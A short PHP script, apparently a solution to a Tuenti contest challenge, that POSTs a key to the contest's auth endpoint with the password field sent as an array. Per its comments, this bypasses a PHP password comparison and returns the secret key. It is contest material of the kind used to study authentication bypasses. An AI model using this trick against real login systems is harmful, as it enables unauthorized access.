<?php
  //Any array works.
  //Documentation: http://www.scip.ch/es/?vuldb.7881
  //Run as: php auth.php <auth.in >auth.out
  $fields = array(
      'a' => 'a',
      'b' => 'b'
  );

  $input = readline();
  //$input = "79bfab6a700d7f1cc7bac1ead16df75cc202ce09";
  $url = 'http://pauth.contest.tuenti.net/';
  $data = array('key' => $input, 'pass' => $fields);

  $options = array(
      'http' => array(
          'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
          'method'  => 'POST',
          'content' => http_build_query($data),
      ),
  );
  $context  = stream_context_create($options);
  $result = file_get_contents($url, false, $context);

  $result = str_replace("welcome masteryour key: ", "", $result);

  echo $result.PHP_EOL;

?>
